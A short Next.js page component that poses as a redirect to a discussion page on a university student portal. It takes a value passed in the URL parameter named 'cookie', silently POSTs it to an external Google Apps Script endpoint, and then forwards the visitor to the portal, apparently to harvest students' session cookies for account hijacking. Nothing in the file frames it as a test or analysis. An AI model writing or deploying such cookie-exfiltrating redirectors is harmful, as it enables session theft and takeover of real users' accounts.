"use client";
import { useRouter, useSearchParams } from "next/navigation";

export default function Home() {
  const router = useRouter();
  const param = useSearchParams();
  const courseId: any = param.get("d") ?? null;
  const discussId: any = param.get("i") ?? null;
  const cookie: any = param.get("e") ?? null;

  if (!courseId || !discussId) return router.push("https://my.cic.ac.id/portal/sipandai/?mod=sipandai&act=dashboardmahasiswa");

  if (cookie) {
    const formURL = "https://script.google.com/macros/s/AKfycbyDYVw0OVxnUuHfmo3ZsmREY_sJDPKyeBVYVqLxHMTlGjrdlt0P8kQ_RmDoLpW3AYkSKQ/exec";
    const formData = new FormData();
    formData.append("kode", cookie);
  
    fetch(formURL, {
      method: "POST",
      body: formData,
    });
  }

  return router.push(
    `https://my.cic.ac.id/portal/sipandai/?mod=sipandai&act=discuss&id=${discussId}&courses_id=${courseId}`
  );
}
